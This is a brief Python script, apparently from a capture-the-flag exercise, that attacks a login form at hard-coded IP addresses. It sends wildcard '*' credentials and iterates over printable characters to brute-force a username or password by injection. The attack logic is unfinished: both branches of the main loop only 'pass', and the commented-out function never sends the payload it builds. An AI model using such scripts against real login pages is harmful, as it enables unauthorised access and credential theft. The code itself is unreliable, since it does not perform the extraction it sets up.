import requests 
from urllib.request import Request
from urllib.request import urlopen
import os 

#url = "http://167.71.143.20:32106/login"
#url = "http://167.71.143.20:30728/login"
url = "http://188.166.168.204:30373/login"



# to check if the login is correct

request_successfully = requests.post(url, data = 
        {
            'username': '*',
            'password': '*'
        })

print(request_successfully.url, request_successfully.status_code)
payload_username = ''
payload_password = ''


for i in range(32, 126):

    username = payload_username + chr(i)+''
    new_request = requests.post(url, data = {'username':username , 'password':'*' }).text

    if new_request == request_successfully.text : 
        pass
    else:
        pass





"""
#x = ''
def authentication(url):
    x = ''
    for i in range(32, 126):

        initial_payload = x+chr(i)+'*'
        request_session = requests.session()
        #password = initial_payload+payload+"*"
        params = {
                'username': '*',
                'password':'*'

                }
        get_url = request_session.post(url, data= params)

        if get_url.status_code == 200:
            #os.system("clear")
            print("decode: ",x, chr(i))
            x += chr(i)
            print(get_url.status_code)
            #exit()
    
    #print("status code %s and url %s"%(get_url.status_code,str(get_url.url)))

    
#authentication(url, "")    
"""    

